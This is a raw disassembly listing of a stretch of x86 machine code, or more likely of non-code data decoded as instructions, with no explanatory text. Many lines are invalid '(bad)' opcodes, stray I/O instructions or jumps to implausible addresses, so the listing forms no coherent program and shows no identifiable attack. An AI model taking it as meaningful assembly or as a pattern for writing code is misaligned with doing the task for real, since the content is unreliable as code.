  42318e:	inc    edi
  42318f:	loopne 0x42311c
	...
  4231f1:	add    BYTE PTR [eax],al
  4231f3:	add    BYTE PTR [ecx-0xf],bh
  4231f6:	div    DWORD PTR [ecx-0x6804801]
  4231fc:	in     al,0xe0
  4231fe:	sub    DWORD PTR [edx+0x429a7c3d],esp
  423204:	push   es
  423205:	ja     0x423208
  423207:	add    BYTE PTR ds:0xd4000001,al
  42320d:	or     BYTE PTR [esi],cl
  42320f:	leave  
  423210:	or     eax,0xd94cc5ff
  423215:	mov    cl,0xba
  423217:	not    DWORD PTR [ecx]
  423219:	inc    ebx
  42321a:	fcomi  st,st(2)
  42321c:	rcl    ch,0x74
  42321f:	jnp    0x423287
  423221:	jns    0x4231fe
  423223:	ds loopne 0x4231ee
  423226:	xchg   ebp,eax
  423227:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423228:	cmovb  eax,edi
  42322b:	sub    dh,BYTE PTR [eax+0x7d3f057]
  423231:	repnz mov cl,0x83
  423234:	lahf   
  423235:	and    al,0x46
  423237:	inc    ebx
  423238:	rol    BYTE PTR [esi],0x66
  42323b:	dec    esi
  42323c:	adc    eax,0xd452aece
  423241:	test   edi,ebp
  423243:	aas    
  423244:	xchg   edi,eax
  423245:	and    DWORD PTR ds:0x70f9c00d,edx
  42324b:	jns    0x423244
  42324d:	bound  ecx,QWORD PTR [ecx+0x618a0fcf]
  423253:	in     al,dx
  423254:	jns    0x423217
  423256:	push   ebp
  423257:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  423259:	xor    DWORD PTR [edi-0x498299b4],ecx
  42325f:	jne    0x423216
  423261:	sub    esp,DWORD PTR [ebx+0x18]
  423264:	mov    esp,0xe72459ba
  423269:	inc    ebx
  42326a:	add    bl,dl
  42326c:	bound  eax,QWORD PTR [ebp-0x605b32e4]
  423272:	iret   
  423273:	gs mov ebp,0x6a2bc500
  423279:	cmp    BYTE PTR [eax-0x397ad0a],ch
  42327f:	jg     0x423270
  423281:	push   0x51f46bab
  423286:	add    eax,0x8f49fbdf
  42328b:	cmp    DWORD PTR [eax],esi
  42328d:	adc    esi,DWORD PTR [ebx]
  42328f:	mov    edi,edx
  423291:	mov    ds:0x2f4b4353,eax
  423296:	or     al,0xb6
  423298:	popa   
  423299:	les    esp,FWORD PTR [ecx-0x4ab608f3]
  42329f:	aad    0x8e
  4232a1:	scas   al,BYTE PTR es:[edi]
  4232a2:	sbb    al,0x98
  4232a4:	shl    BYTE PTR [ecx],1
  4232a6:	pop    ds
  4232a7:	jo     0x423266
  4232a9:	fdivrp st(1),st
  4232ab:	xor    eax,0x36850a0
  4232b0:	int3   
  4232b1:	inc    edx
  4232b2:	mov    dl,0x42
  4232b4:	jb     0x4232f7
  4232b6:	xchg   esi,eax
  4232b7:	sub    DWORD PTR [ebx+0x44],ebx
  4232ba:	inc    ecx
  4232bb:	out    dx,eax
  4232bc:	(bad)  
  4232bd:	(bad)  
  4232be:	jp     0x423296
  4232c0:	retf   0xaa54
  4232c3:	rol    DWORD PTR [esi],1
  4232c5:	mov    ds:0xb20526af,eax
  4232ca:	xchg   esi,eax
  4232cb:	push   cs
  4232cc:	dec    ebx
  4232cd:	push   es
  4232ce:	xchg   esi,eax
  4232cf:	and    esi,DWORD PTR [ebx-0x43e5682b]
  4232d5:	pushf  
  4232d6:	test   BYTE PTR [ebp-0x4e],ah
  4232d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4232da:	iret   
  4232db:	jp     0x4232fe
  4232dd:	jmp    0x423302
  4232df:	scas   eax,DWORD PTR es:[edi]
  4232e0:	adc    edi,DWORD PTR [edi+0x3acdeedb]
  4232e6:	fcom   DWORD PTR [esi-0x63360cfd]
  4232ec:	adc    BYTE PTR gs:[edi],dh
  4232ef:	into   
  4232f0:	inc    edi
  4232f1:	push   cs
  4232f2:	cmp    al,0xa5
  4232f4:	ror    dl,1
  4232f6:	pop    esp
  4232f7:	xchg   DWORD PTR [eax],ebp
  4232f9:	or     ah,dl
  4232fb:	cmp    eax,0x60d2faa2
  423300:	in     al,dx
  423301:	lds    esi,FWORD PTR [ebx]
  423303:	rcl    BYTE PTR [ecx+ebp*1-0x6a9bd0d6],1
  42330a:	add    al,0xd8
  42330c:	cmp    edx,edx
  42330e:	mov    al,ds:0x2568
	...
  423373:	add    al,bh
  423375:	fisub  WORD PTR [edx+0x30]
  423378:	mov    sp,0xdefa
  42337c:	mov    eax,fs:0x6cab0f44
  423382:	int    0x1d
  423384:	or     edi,DWORD PTR [eax+0x1]
  423387:	add    BYTE PTR ds:0xc3000001,al
  42338d:	add    al,0xf2
  42338f:	dec    ebx
  423390:	repnz dec ecx
  423392:	xlat   BYTE PTR ds:[ebx]
  423393:	sbb    ch,ch
  423395:	stc    
  423396:	adc    bh,ch
  423398:	xchg   esp,eax
  423399:	xchg   BYTE PTR [ebx],cl
  42339b:	addr16 dec esp
  42339d:	in     al,dx
  42339e:	dec    eax
  42339f:	icebp  
  4233a0:	mov    ecx,DWORD PTR [edx]
  4233a2:	mov    DWORD PTR [edi+ecx*2-0x31],edi
  4233a6:	stc    
  4233a7:	push   edx
  4233a8:	inc    eax
  4233a9:	ss push ss
  4233ab:	jne    0x423380
  4233ad:	push   ss
  4233ae:	xchg   ebx,eax
  4233af:	xchg   esp,eax
  4233b0:	mov    ch,0x84
  4233b2:	cdq    
  4233b3:	out    0x9d,al
  4233b5:	dec    ebx
  4233b6:	rcl    edi,cl
  4233b8:	push   cs
  4233b9:	mov    ebp,0xc4685cd4
  4233be:	sub    dl,ah
  4233c0:	(bad)  
  4233c1:	adc    DWORD PTR [ecx-0x7b],edx
  4233c4:	push   ds
  4233c5:	fstp   TBYTE PTR [ebp+0x639f582b]
  4233cb:	sub    esp,ebp
  4233cd:	jno    0x4233cf
  4233cf:	jecxz  0x4233ee
  4233d1:	and    DWORD PTR [edi+0x2607c7ff],ebx
  4233d7:	and    BYTE PTR [esp+esi*4+0x3],ch
  4233db:	pop    esi
  4233dc:	xchg   ecx,eax
  4233dd:	sbb    esp,DWORD PTR [eax+0x6927bb9c]
  4233e3:	jge    0x4233e4
  4233e5:	push   esp
  4233e6:	xchg   ecx,eax
  4233e7:	adc    DWORD PTR [eax],0xffffff8b
  4233ea:	int3   
  4233eb:	push   0xfffffffc
  4233ed:	inc    esp
  4233ee:	fsubr  st(5),st
  4233f0:	dec    ebp
  4233f1:	(bad)  
  4233f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4233f3:	mov    ah,0x68
  4233f5:	mov    edx,0x48d0a2d2
  4233fa:	daa    
  4233fb:	jae    0x4233ff
  4233fd:	mov    eax,0xb251f869
  423402:	dec    ebx
  423403:	shl    ch,cl
  423405:	sbb    al,0x41
  423407:	xor    al,0xdc
  423409:	push   edi
  42340a:	and    DWORD PTR [edx+0x3cc798f8],eax
  423410:	cdq    
  423411:	adc    esi,DWORD PTR [edi]
  423413:	add    ch,BYTE PTR [esi]
  423415:	pop    edi
  423416:	shl    DWORD PTR [edx+0x7d],0xcf
  42341a:	cmp    BYTE PTR [eax-0x71],ah
  42341d:	adc    edi,DWORD PTR [ecx-0x6b]
  423420:	das    
  423421:	push   eax
  423422:	sub    BYTE PTR [edi+ebp*8+0x46],0xa2
  423427:	enter  0xabe6,0x7b
  42342b:	rcl    dh,1
  42342d:	rcl    BYTE PTR [esi-0x5e8e50b6],0x15
  423434:	scas   eax,DWORD PTR es:[edi]
  423435:	ret    
  423436:	bound  ebp,QWORD PTR [edi+0x5e]
  423439:	repz inc DWORD PTR [esi-0x3d0c182b]
  423440:	push   ss
  423441:	call   0xa85d:0x195f57a2
  423448:	cmp    BYTE PTR [eax],ch
  42344a:	xchg   BYTE PTR [edi-0x66d4b57e],ch
  423450:	push   es
  423451:	ins    BYTE PTR es:[edi],dx
  423452:	fidivr DWORD PTR [edi]
  423454:	jb     0x4234c1
  423456:	(bad)  
  423457:	fcomp  DWORD PTR [ebx+ebx*8-0x5]
  42345b:	pop    ebx
  42345c:	inc    BYTE PTR [ecx]
  42345e:	mov    esp,es
  423460:	jmp    0x662413ae
  423465:	scas   eax,DWORD PTR es:[edi]
  423466:	sub    al,0xf6
  423468:	inc    esp
  423469:	leave  
  42346a:	aas    
  42346b:	mov    ebx,DWORD PTR ds:0x931e19ac
  423471:	mov    esp,0x5f6026e0
  423476:	and    BYTE PTR [esi+0x6a],ah
  423479:	cmp    esp,DWORD PTR [ecx-0x2efec5f4]
  42347f:	jbe    0x423491
  423481:	(bad)  
  423482:	fimul  DWORD PTR [esi]
  423484:	push   esp
  423485:	push   ebx
  423486:	pop    edx
  423487:	push   esp
  423488:	add    BYTE PTR [edx],bl
  42348a:	dec    esp
  42348b:	hlt    
  42348c:	or     al,0xe5
  42348e:	xor    al,0x4c
  423490:	retf   
	...
  4234f1:	add    BYTE PTR [eax],al
  4234f3:	add    al,al
  4234f5:	mov    al,0x45
  4234f7:	outs   dx,DWORD PTR ds:[esi]
  4234f8:	jne    0x4234f9
  4234fa:	jmp    0xfc1f:0xadf467bf
  423501:	sub    eax,0x79106031
  423506:	add    DWORD PTR [eax],eax
  423508:	add    eax,0xe4000001
  42350d:	pusha  
  42350e:	mov    edi,DWORD PTR [ecx-0x6e]
  423511:	xor    DWORD PTR [esi+0x5b],edi
  423514:	jo     0x4234ee
  423516:	fwait
  423517:	ja     0x4234db
  423519:	(bad)  
  42351a:	mov    esi,0x5bc89feb
  42351f:	outs   dx,BYTE PTR ds:[esi]
  423520:	jne    0x423522
  423522:	add    dl,BYTE PTR [eax-0x38381659]
  423528:	(bad)  
  423529:	fbstp  TBYTE PTR [esp+ecx*2-0x5f]
  42352d:	cmp    al,0xa9
  42352f:	push   ebx
  423530:	cmp    edi,ebx
  423532:	das    
  423533:	mov    dl,ch
  423535:	les    edx,FWORD PTR [ebp+0x7c]
  423538:	test   eax,0xc7cee664
  42353d:	mov    esp,0xfb47a9f4
  423542:	(bad)  
  423543:	imul   BYTE PTR [edi+edi*1]
  423546:	fmulp  st(6),st
  423548:	popa   
  423549:	pushf  
  42354a:	and    al,0x2d
  42354c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42354d:	sahf   
  42354e:	pop    ebp
  42354f:	sbb    ebp,DWORD PTR [eax+0x221c2c47]
  423555:	and    DWORD PTR [eax+0x57],edi
  423558:	jecxz  0x4235ab
  42355a:	xchg   ebx,eax
  42355b:	fcomp  QWORD PTR [ecx+0x37aca119]
  423561:	pop    ebp
  423562:	mov    al,0x69
  423564:	rol    DWORD PTR [ebp+0x41379286],cl
  42356a:	pop    esi
  42356b:	xor    edi,esi
  42356d:	bound  esp,QWORD PTR [ebx+0x60]
  423570:	add    ch,dl
  423572:	popf   
  423573:	retw   
  423575:	shl    WORD PTR [edx-0x111303c1],cl
  42357c:	sub    BYTE PTR [eax],0x46
  42357f:	int    0xf5
  423581:	cs ins BYTE PTR es:[edi],dx
  423583:	mov    ebp,0x9e3de383
  423588:	add    esp,DWORD PTR [ebp-0x4331b374]
  42358e:	add    ebp,DWORD PTR [eax+0x7a]
  423591:	jg     0x423534
  423593:	mov    cl,0xcb
  423595:	je     0x42353a
  423597:	shl    DWORD PTR [ebx+0x48],cl
  42359a:	pusha  
  42359b:	and    eax,0xfae2d99a
  4235a0:	fcomp  DWORD PTR [ebx]
  4235a2:	push   ecx
  4235a3:	xchg   DWORD PTR [ecx],esi
  4235a5:	xchg   edx,eax
  4235a6:	xchg   ecx,eax
  4235a7:	mov    al,0x84
  4235a9:	(bad)
  4235ad:	into   
  4235ae:	sub    DWORD PTR [edx],ebx
  4235b0:	adc    eax,0x15911db8
  4235b5:	jnp    0x423620
  4235b7:	or     al,0x89
  4235b9:	jg     0x4235d4
  4235bb:	xor    bh,cl
  4235bd:	(bad)  
  4235be:	xchg   ecx,eax
  4235bf:	fisttp WORD PTR [edx]
  4235c1:	retf   
  4235c2:	jbe    0x4235e4
  4235c4:	mov    ds:0x26ae70c9,eax
  4235c9:	(bad)  
  4235ca:	xlat   BYTE PTR ds:[ebx]
  4235cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4235cc:	jno    0x4235d3
  4235ce:	add    BYTE PTR [ebx+ebx*2+0x407ba01a],bl
  4235d5:	lock or BYTE PTR [eax-0x1e],ch
  4235d9:	jo     0x423650
  4235db:	add    al,0x42
  4235dd:	adc    cl,BYTE PTR [ebp+0x288956b2]
  4235e3:	pop    edi
  4235e4:	outs   dx,BYTE PTR ds:[esi]
  4235e5:	cmp    DWORD PTR [ebp-0x2a],eax
  4235e8:	mov    BYTE PTR [ebx+0x52],0xc5
  4235ec:	mov    ah,0x3a
  4235ee:	add    dl,BYTE PTR [edi+ebx*4]
  4235f1:	pop    ecx
  4235f2:	jl     0x4235a6
  4235f4:	inc    edx
  4235f5:	popa   
  4235f6:	xchg   edi,eax
  4235f7:	not    DWORD PTR [edx+0x37]
  4235fa:	jno    0x4235d5
  4235fc:	push   0xf5f6d7c0
  423601:	test   DWORD PTR [edi+ebp*2-0x2dd06af9],eax
  423608:	outs   dx,DWORD PTR ds:[esi]
  423609:	inc    edi
  42360a:	adc    BYTE PTR [edx-0x1d],cl
  42360d:	push   es
  42360e:	jne    0x4235c8
  423610:	cmp    eax,0x0
	...
  423671:	add    BYTE PTR [eax],al
  423673:	add    BYTE PTR [eax+0x7f747c8f],al
  423679:	test   DWORD PTR [eax+0x7c916eff],0x4971e713
  423683:	pop    esp
  423684:	adc    eax,0x500017a
  423689:	add    DWORD PTR [eax],eax
  42368b:	add    BYTE PTR [ecx],al
  42368d:	and    al,BYTE PTR [esp+eax*8+0x5393356a]
  423694:	add    al,0x8e
  423696:	scas   eax,DWORD PTR es:[edi]
  423697:	sub    eax,0x7465ca15
  42369c:	ret    
  42369d:	dec    edx
  42369e:	es test al,0x81
  4236a1:	sub    edi,DWORD PTR es:[ebx+0x602c8c89]
  4236a8:	ficomp WORD PTR [ebp+0x1]
  4236ab:	mov    ebx,0x765505a8
  4236b0:	xor    cl,bh
  4236b2:	mov    bh,0xf7
  4236b4:	adc    dh,BYTE PTR [eax-0x474211ec]
  4236ba:	(bad)
  4236bd:	and    dl,BYTE PTR [edi]
  4236bf:	outs   dx,BYTE PTR ds:[esi]
  4236c0:	sbb    cl,ch
  4236c2:	inc    edi
  4236c3:	call   0xb10114cf
  4236c8:	sbb    dh,BYTE PTR ds:0x3236f6c9
  4236ce:	add    eax,0x13940174
  4236d3:	shr    BYTE PTR [esi],cl
  4236d5:	aas    
  4236d6:	lds    eax,FWORD PTR [edi]
  4236d8:	add    al,0x3b
  4236da:	test   DWORD PTR [eax-0x56],ebp
  4236dd:	test   esi,ebp
  4236df:	mov    al,ds:0x57d9b685
  4236e4:	adc    eax,ebp
  4236e6:	jno    0x4236ca
  4236e8:	pop    ecx
  4236e9:	fwait
  4236ea:	sbb    al,0xe
  4236ec:	mov    edi,0xbee080b3
  4236f1:	mov    edx,0x6e6e01c9
  4236f6:	clc    
  4236f7:	adc    BYTE PTR [ecx],dl
  4236f9:	cdq    
  4236fa:	icebp  
  4236fb:	loop   0x4236b9
  4236fd:	jnp    0x4236e1
  4236ff:	mov    es,WORD PTR [eax]
  423701:	xchg   dh,cl
  423703:	mov    al,0xaf
  423705:	(bad)  
  423706:	inc    ebx
  423707:	or     esi,DWORD PTR ds:0x8cdd8ac4
  42370d:	and    dh,BYTE PTR [ebp+0x21]
  423710:	fsub   QWORD PTR [edi-0x4e]
  423713:	mov    ebp,0xd5d87858
  423718:	and    edi,esp
  42371a:	or     edx,DWORD PTR gs:[esi+edx*4]
  42371e:	push   edx
  42371f:	rcl    DWORD PTR [ecx],0x98
  423722:	int3   
  423723:	fiadd  DWORD PTR [edi-0x2558a4e8]
  423729:	xlat   BYTE PTR ds:[ebx]
  42372a:	adc    eax,edx
  42372c:	(bad)  
  42372d:	sub    DWORD PTR [eax-0xcb32542],edx
  423733:	push   DWORD PTR ds:0x243dde09
  423739:	jno    0x42376a
  42373b:	hlt    
  42373c:	dec    edx
  42373d:	pop    ebp
  42373e:	jl     0x42375b
  423740:	sub    DWORD PTR [ebx+0x7906d7d9],esp
  423746:	out    0x32,eax
  423748:	sub    eax,0x775798e8
  42374d:	jo     0x423737
  42374f:	xor    eax,0xf2293da4
  423754:	jns    0x42378d
  423756:	mov    edi,DWORD PTR [ebx]
  423758:	mov    ah,0x9d
  42375a:	cmp    DWORD PTR [edi+0x23e4d3fc],0x2f4d8111
  423764:	retf   
  423765:	pop    esi
  423766:	adc    dl,al
  423768:	jne    0x4237e4
  42376a:	gs push eax
  42376c:	pop    edi
  42376d:	(bad)  
  42376f:	jecxz  0x4237df
  423771:	add    al,0x43
  423773:	pop    ss
  423774:	xchg   esp,eax
  423775:	cmp    esp,DWORD PTR [esi]
  423777:	loop   0x423704
  423779:	nop
  42377a:	mov    ebp,0xceecf05f
  42377f:	xlat   BYTE PTR ds:[ebx]
  423780:	jno    0x423717
  423782:	jno    0x4237d0
  423784:	xor    eax,0xbf1df3f0
  423789:	xchg   edx,eax
  42378a:	in     eax,0x45
  42378c:	jg     0x4237d8
  42378e:	or     BYTE PTR [ecx],bh
  423790:	dec    esi
	...
  4237f1:	add    BYTE PTR [eax],al
  4237f3:	add    BYTE PTR [ebx+eiz*1],dh
  4237f6:	jo     0x423795
  4237f8:	ja     0x4237d9
  4237fa:	std    
  4237fb:	stos   DWORD PTR es:[edi],eax
  4237fc:	(bad)  
  4237fd:	sbb    edx,esi
  4237ff:	jmp    0x7b1a:0x912ce1ca
  423806:	add    DWORD PTR [eax],eax
  423808:	add    eax,0xff000001
  42380d:	inc    eax
  42380e:	adc    bl,BYTE PTR [edi-0x8176787]
  423814:	into   
  423815:	cli    
  423816:	neg    BYTE PTR [ebx+0x4e128e61]
  42381c:	or     eax,0xf10078d2
  423821:	pop    ebp
  423822:	add    eax,0x6e72e0cf
  423827:	ins    DWORD PTR es:[edi],dx
  423828:	cmc    
  423829:	push   edx
  42382a:	lea    esp,[edx-0x37]
  42382d:	push   ebp
  42382e:	and    ebx,DWORD PTR [edi]
  423830:	aaa    
  423831:	cwde   
  423832:	lahf   
  423833:	sub    DWORD PTR [edi-0x77],esp
  423836:	neg    ah
  423838:	lock push edx
  42383a:	mov    ebp,?
  42383c:	imul   ebx,DWORD PTR [ebx+0x39],0xfffffff6
  423840:	je     0x42382c
  423842:	es jo  0x423840
  423845:	cmp    bh,dl
  423847:	fs (bad) 
  423849:	mov    bh,0xc4
  42384b:	add    eax,0x4272a4ef
  423850:	pop    esi
  423851:	data16 xor bh,BYTE PTR [ebx]
  423854:	mov    esi,0xb99155a1
  423859:	ins    BYTE PTR es:[edi],dx
  42385a:	xor    ah,BYTE PTR [esi]
  42385c:	mov    ds:0x2ca5c937,al
  423861:	cmp    esp,0xb82b02c1
  423867:	daa    
  423868:	addr16 inc edx
  42386a:	in     al,0x7b
  42386c:	mov    dl,0xb6
  42386e:	mov    esp,0xd65c278
  423873:	dec    esi
  423874:	daa    
  423875:	out    dx,al
  423876:	aam    0x1d
  423878:	xor    eax,0xc3fe3098
  42387d:	sbb    DWORD PTR [esi],ebx
  42387f:	xor    edx,edi
  423881:	stos   DWORD PTR es:[edi],eax
  423882:	and    cl,BYTE PTR [edi+0x12]
  423885:	push   0xffffffb3
  423887:	aam    0x7b
  423889:	xchg   ebp,eax
  42388a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42388b:	fcmovnb st,st(0)
  42388d:	mov    esi,0xbe9c826a
  423892:	sub    BYTE PTR [ecx+0x6b367f2],0xff
  423899:	sbb    DWORD PTR [ebx-0x68],edx
  42389c:	cmp    al,0xcc
  42389e:	or     DWORD PTR [esi-0x63],ebx
  4238a1:	pop    ds
  4238a2:	mov    esp,0xfc13cf19
  4238a7:	add    BYTE PTR [eax-0xae0a989],0x4b
  4238ae:	data16 mov cs,WORD PTR [esi-0x32]
  4238b2:	es and al,0x9c
  4238b5:	push   esp
  4238b6:	stos   DWORD PTR es:[edi],eax
  4238b7:	repz js 0x423862
  4238ba:	jl     0x4238ea
  4238bc:	retf   
  4238bd:	sub    BYTE PTR [edx],al
  4238bf:	adc    DWORD PTR [ebx+0x48cae625],0xfffffff8
  4238c6:	popa   
  4238c7:	mov    dh,0x94
  4238c9:	sti    
  4238ca:	mov    ds,WORD PTR [edx+0x7c]
  4238cd:	repz xor BYTE PTR [eax-0xb],al
  4238d1:	inc    edi
  4238d2:	cmp    eax,0xf3b94608
  4238d7:	pop    esp
  4238d8:	mov    dl,0x6
  4238da:	mov    cl,0x97
  4238dc:	inc    eax
  4238dd:	dec    ecx
  4238de:	add    al,0xe1
  4238e0:	jns    0x4238b1
  4238e2:	cli    
  4238e3:	mov    eax,ds:0xfc7837e0
  4238e8:	or     dh,ah
  4238ea:	out    dx,eax
  4238eb:	inc    ebp
  4238ec:	sbb    ch,BYTE PTR [ebp-0x4d31a30f]
  4238f2:	cmc    
  4238f3:	mov    edi,0xa21c922d
  4238f8:	into   
  4238f9:	daa    
  4238fa:	cwde   
  4238fb:	lods   eax,DWORD PTR ds:[esi]
  4238fc:	loopne 0x42395b
  4238fe:	shr    DWORD PTR [esi-0x30],0x24
  423902:	push   ss
  423903:	mov    bh,0xd0
  423905:	pop    ds
  423906:	ins    BYTE PTR es:[edi],dx
  423907:	jne    0x4238e3
  423909:	fadd   st,st(2)
  42390b:	and    al,0x39
  42390d:	jb     0x423937
  42390f:	fld    QWORD PTR ds:[eax]
	...
  423972:	add    BYTE PTR [eax],al
  423974:	mov    ah,BYTE PTR [ecx+esi*8-0x4220078]
  42397b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42397c:	push   ecx
  42397d:	sbb    eax,0xaa082bbd
  423982:	xor    cl,dh
  423984:	pop    ds
  423985:	jl     0x423988
  423987:	add    BYTE PTR ds:0x74000001,al
  42398d:	cwde   
  42398e:	daa    
  42398f:	fcmovb st,st(7)
  423991:	(bad)  
  423992:	(bad)  
  423993:	mov    ch,0x4c
  423995:	stos   DWORD PTR es:[edi],eax
  423996:	cmp    al,0xdf
  423998:	mov    edi,0xb85ab76
  42399d:	jns    0x4239f1
  42399f:	push   ds
  4239a0:	and    esp,DWORD PTR [eax-0x77]
  4239a3:	cwde   
  4239a4:	mov    cl,0xe7
  4239a6:	inc    esp
  4239a7:	sub    DWORD PTR [ecx+0x19],eax
  4239aa:	sti    
  4239ab:	inc    esp
  4239ac:	fcmove st,st(0)
  4239ae:	inc    esp
  4239af:	popf   
  4239b0:	fucom  st(1)
  4239b2:	sbb    al,0x2c
  4239b4:	imul   ecx,DWORD PTR [esi+0x4c],0xffffff8d
  4239b8:	add    edi,DWORD PTR [edx]
  4239ba:	stos   DWORD PTR es:[edi],eax
  4239bb:	int    0xe4
  4239bd:	mov    bl,0x6e
  4239bf:	in     al,0x16
  4239c1:	mov    ecx,0xb589d2c4
  4239c6:	adc    BYTE PTR ds:0x268a65c0,bl
  4239cc:	ret    0x527b
  4239cf:	mov    bl,0x23
  4239d1:	stos   DWORD PTR es:[edi],eax
  4239d2:	mov    ebx,0xdab6f991
  4239d7:	xor    eax,0x6fb93081
  4239dc:	push   0xdde6b266
  4239e1:	sub    BYTE PTR [ebp-0x26],al
  4239e4:	pop    edx
  4239e5:	rol    esi,0xab
  4239e8:	pop    ecx
  4239e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4239ea:	or     eax,0x56234d8
  4239ef:	xchg   edi,eax
  4239f0:	lds    eax,FWORD PTR [edx+0x39]
  4239f3:	paddw  mm2,QWORD PTR [ecx+0x3a2d0aa7]
  4239fa:	test   DWORD PTR [esi+0x59004571],edx
  423a00:	cmc    
  423a01:	push   ecx
  423a02:	call   0x92d7784d
  423a07:	mov    eax,ds:0x22f0f95b
  423a0c:	stos   BYTE PTR es:[edi],al
  423a0d:	stc    
  423a0e:	sahf   
  423a0f:	xchg   edi,eax
  423a10:	mov    ah,0xe4
  423a12:	or     DWORD PTR [ebx],edx
  423a14:	add    BYTE PTR ds:0x3f8ccc6c,dh
  423a1a:	loop   0x4239e7
  423a1c:	inc    ebx
  423a1d:	mov    edx,0x6004a82a
  423a22:	jecxz  0x423a20
  423a24:	xchg   esp,eax
  423a25:	call   0xcf11:0x38bfe422
  423a2c:	dec    edx
  423a2d:	pop    ss
  423a2e:	je     0x423aa3
  423a30:	add    DWORD PTR [ebx-0x31b1bbd7],ebp
  423a36:	retf   
  423a37:	add    BYTE PTR [edi-0x73],0xb7
  423a3b:	push   ss
  423a3c:	das    
  423a3d:	ror    DWORD PTR [ebx-0x4adbc73],1
  423a43:	scas   eax,DWORD PTR es:[edi]
  423a44:	ins    BYTE PTR es:[edi],dx
  423a45:	aad    0x55
  423a47:	sub    DWORD PTR [esi],ecx
  423a49:	cmp    DWORD PTR [ebp+0x5bdf5016],ebp
  423a4f:	test   BYTE PTR [ebx+0x34],0xd1
  423a53:	mov    al,ds:0xd0facc58
  423a58:	cmp    al,BYTE PTR [ebx]
  423a5a:	jne    0x423ab8
  423a5c:	int3   
  423a5d:	fldenv [eax]
  423a5f:	sub    eax,0x278f559
  423a64:	scas   al,BYTE PTR es:[edi]
  423a65:	cmc    
  423a66:	or     edx,DWORD PTR [ebp+0x6c62f5cd]
  423a6c:	mov    esp,edi
  423a6e:	repnz bnd ret 
  423a71:	mov    esp,cs
  423a73:	ja     0x423a1a
  423a75:	imul   ebp,DWORD PTR [ecx],0x8ebd4b82
  423a7b:	jb     0x423ae9
  423a7d:	sbb    al,BYTE PTR [eax-0x3d5aaf1a]
  423a83:	js     0x423ad3
  423a85:	push   es
  423a86:	(bad)  [edi+0x55231bc9]
  423a8d:	xchg   esi,eax
  423a8e:	out    0xb0,eax
  423a90:	push   esi
	...
  423af1:	add    BYTE PTR [eax],al
  423af3:	add    BYTE PTR [eax],dh
  423af5:	cmp    eax,0xdf7d9f75
  423afa:	cli    
  423afb:	mov    edi,0x60851ed8
  423b00:	(bad)  
  423b01:	(bad)  
  423b02:	cmp    DWORD PTR ds:[edi*2+0x1050001],esp
  423b0a:	add    BYTE PTR [eax],al
  423b0c:	cmp    al,BYTE PTR [esi]
  423b0e:	mov    ds:0x5a295d73,eax
  423b13:	pop    edi
  423b14:	and    esi,ebx
  423b16:	jbe    0x423aba
  423b18:	xor    al,0x79
  423b1a:	pushf  
  423b1b:	push   edi
  423b1c:	stc    
  423b1d:	popf   
  423b1e:	xchg   edi,eax
  423b1f:	xor    al,dl
  423b21:	add    DWORD PTR [esi-0x42],eax
  423b24:	cmp    ah,BYTE PTR [esp+esi*2-0x3a]
  423b28:	ror    DWORD PTR [ecx+ebx*1-0x57],1
  423b2c:	ja     0x423b47
  423b2e:	mov    al,0x15
  423b30:	cli    
  423b31:	add    eax,ebp
  423b33:	jmp    0x46121240
  423b38:	jp     0x423b5b
  423b3a:	mov    bh,dh
  423b3c:	xor    BYTE PTR [ecx+0x6a],ah
  423b3f:	xchg   edi,eax
  423b40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423b41:	loop   0x423b46
  423b43:	shl    BYTE PTR [ebx-0x5aa83abb],cl
  423b49:	sbb    DWORD PTR [ebx],edi
  423b4b:	dec    ebx
  423b4c:	xor    eax,0x174ad9e1
  423b51:	sub    al,0xb
  423b53:	mov    edi,0x2ac117c1
  423b58:	pushf  
  423b59:	in     al,0xbc
  423b5b:	je     0x423bc4
  423b5d:	push   ebp
  423b5e:	mov    edx,0x1ec98da9
  423b63:	loope  0x423b91
  423b65:	mov    ?,esi
  423b67:	and    DWORD PTR [edx-0x54],ebp
  423b6a:	sbb    DWORD PTR ds:[ecx+0x4c],edx
  423b6e:	jb     0x423b45
  423b70:	outs   dx,DWORD PTR ds:[esi]
  423b71:	fistp  WORD PTR [ebx+0x7d4b513f]
  423b77:	adc    al,0xc8
  423b79:	mov    edx,DWORD PTR [eax+0x68196afa]
  423b7f:	ret    0xc0f
  423b82:	sbb    edi,DWORD PTR [ebp+0x3ab7af65]
  423b88:	inc    eax
  423b89:	inc    edi
  423b8a:	fwait
  423b8b:	inc    eax
  423b8c:	dec    ecx
  423b8d:	and    al,0xf4
  423b8f:	cmp    bl,dl
  423b91:	repnz cld 
  423b93:	or     eax,DWORD PTR gs:[edx-0x41]
  423b97:	ins    DWORD PTR es:[edi],dx
  423b98:	jbe    0x423b99
  423b9a:	jnp    0x423b9c
  423b9c:	mov    dl,0xb5
  423b9e:	imul   ecx,DWORD PTR [edx+edx*4-0x14],0xea71fe49
  423ba6:	mov    ds:0xe463a9e6,eax
  423bab:	repnz pushf 
  423bad:	cmp    al,0x50
  423baf:	and    BYTE PTR [esi+ecx*2+0x13bf62b4],ah
  423bb6:	xor    dl,bh
  423bb8:	lods   eax,DWORD PTR ds:[esi]
  423bb9:	jmp    DWORD PTR [esi-0x7f]
  423bbc:	sub    BYTE PTR [ebp+0x63],0x9
  423bc0:	lahf   
  423bc1:	inc    esi
  423bc2:	sahf   
  423bc3:	cmp    dh,BYTE PTR [ebx]
  423bc5:	mov    esi,0x66cff73c
  423bca:	loop   0x423b83
  423bcc:	push   edx
  423bcd:	cmp    edx,DWORD PTR ds:0x6afdcda
  423bd3:	imul   esp,DWORD PTR [edx+0x63885fd],0xffffffd8
  423bda:	xchg   ebx,eax
  423bdb:	daa    
  423bdc:	cld    
  423bdd:	mov    ebx,DWORD PTR [esi]
  423bdf:	arpl   WORD PTR [edx+0x6a6767d5],bx
  423be5:	jo     0x423bda
  423be7:	mov    bl,0x61
  423be9:	push   ebx
  423bea:	(bad)  
  423bec:	dec    esi
  423bed:	mov    al,0xbd
  423bef:	enter  0xb346,0xc0
